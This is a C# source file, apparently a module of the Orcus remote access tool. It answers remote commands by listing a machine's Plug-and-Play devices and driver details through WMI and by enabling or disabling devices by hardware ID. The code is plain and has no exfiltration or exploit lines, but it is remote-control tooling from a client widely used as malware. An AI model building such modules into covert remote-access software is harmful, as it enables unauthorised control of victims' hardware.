using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Text;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.DeviceManager;
using Orcus.Shared.NetSerializer;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Commands.DeviceManager
{
    public class DeviceManagerCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            switch ((DeviceManagerCommunication) parameter[0])
            {
                case DeviceManagerCommunication.GetDevices:
                    ResponseBytes((byte) DeviceManagerCommunication.ResponseDevices,
                        new Serializer(typeof (List<DeviceInfo>)).Serialize(GetAllDevices()), connectionInfo);
                    break;
                case DeviceManagerCommunication.SetDeviceState:
                    var hardwareId = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
                    foreach (var temporaryDeviceInfo in HardwareHelper.EnumerateDevices())
                    {
                        if (temporaryDeviceInfo.GetProperty(SPDRP.SPDRP_HARDWAREID) == hardwareId)
                        {
                            try
                            {
                                HardwareHelper.EnableDevice(temporaryDeviceInfo.HDevInfo, temporaryDeviceInfo.DeviceData, parameter[1] == 1);
                                var cutParameter = new byte[parameter.Length - 1];
                                Array.Copy(parameter, 1, cutParameter, 0, cutParameter.Length);

                                ResponseBytes((byte) DeviceManagerCommunication.DeviceStateChangedSuccessfully,
                                    cutParameter, connectionInfo);
                            }
                            catch (Exception ex)
                            {
                                ResponseBytes((byte) DeviceManagerCommunication.ErrorChangingDeviceState,
                                    Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
                            }
                            return;
                        }
                    }

                    ResponseByte((byte) DeviceManagerCommunication.ErrorDeviceNotFound, connectionInfo);
                    break;
            }
        }

        private List<DeviceInfo> GetAllDevices()
        {
            var list = new List<DeviceInfo>();
            using (
                var searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\CIMV2",
                    "Select * from Win32_PnPEntity"))
            using (var collection = searcher.Get())
            {
                foreach (var managementObject in collection.Cast<ManagementObject>())
                {
                    if (managementObject.TryGetProperty<string>("DeviceId") == @"HTREE\ROOT\0")
                        continue;

                    var device = new DeviceInfo
                    {
                        Name = managementObject.TryGetProperty<string>("Caption"),
                        DeviceId = managementObject.TryGetProperty<string>("DeviceId"),
                        Description = managementObject.TryGetProperty<string>("Description"),
                        Manufacturer = managementObject.TryGetProperty<string>("Manufacturer"),
                        StatusCode = managementObject.TryGetProperty<uint>("ConfigManagerErrorCode")
                    };
                    var hardwareIds = managementObject.TryGetProperty<string[]>("HardWareID");
                    if (hardwareIds?.Length > 0)
                        device.HardwareId = hardwareIds[0];

                    list.Add(device);
                    var classGuidString = managementObject.TryGetProperty<string>("ClassGuid");
                    Guid classGuid;
#if NET35
                    try
                    {
                        classGuid = new Guid(classGuidString);
                    }
                    catch (Exception)
                    {
                        classGuid = Guid.Empty;
                    }
#else
                    if (!Guid.TryParse(classGuidString, out classGuid))
                        classGuid = Guid.Empty;
#endif
                    device.Category = DeviceCategory.None;
                    

                    foreach (var value in (DeviceCategory[]) Enum.GetValues(typeof (DeviceCategory)))
                    {
                        if (value.GetAttributeOfType<DeviceCategoryGuidAttribute>().Guid == classGuid)
                        {
                            device.Category = value;
                            break;
                        }
                    }

                    if (device.Category == DeviceCategory.None)
                        device.CustomCategory = managementObject.TryGetProperty<string>("PNPClass");
                }
            }

            using (
                var searcher = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\CIMV2",
                    "Select * from Win32_PnPSignedDriver"))
            using (var collection = searcher.Get())
            {
                foreach (var managementObject in collection.Cast<ManagementObject>())
                {
                    var deviceId = managementObject.TryGetProperty<string>("DeviceID");
                    var device = list.FirstOrDefault(x => x.DeviceId == deviceId);
                    if (device != null)
                    {
                        device.DriverFriendlyName = managementObject.TryGetProperty<string>("FriendlyName");
                        var buildDate = managementObject.TryGetProperty<string>("DriverDate");
                        if (buildDate != null)
                            device.DriverBuildDate = (ManagementExtensions.ToDateTimeSafe(buildDate) ?? DateTime.MinValue).ToUniversalTime();
                        device.DriverDescription = managementObject.TryGetProperty<string>("Description");
                        var installDate = managementObject.TryGetProperty<string>("InstallDate");
                        if (installDate != null)
                            device.DriverInstallDate =
                                (ManagementExtensions.ToDateTimeSafe(installDate) ?? DateTime.MinValue).ToUniversalTime();
                        device.DriverName = managementObject.TryGetProperty<string>("DriverName");
                        device.DriverProviderName = managementObject.TryGetProperty<string>("DriverProviderName");
                        device.DriverSigner = managementObject.TryGetProperty<string>("Signer");
                        device.DriverVersion = managementObject.TryGetProperty<string>("DriverVersion");
                        device.DriverInfName = managementObject.TryGetProperty<string>("InfName");
                    }
                }
            }

            return list;
        }

        protected override uint GetId()
        {
            return 30;
        }
    }
}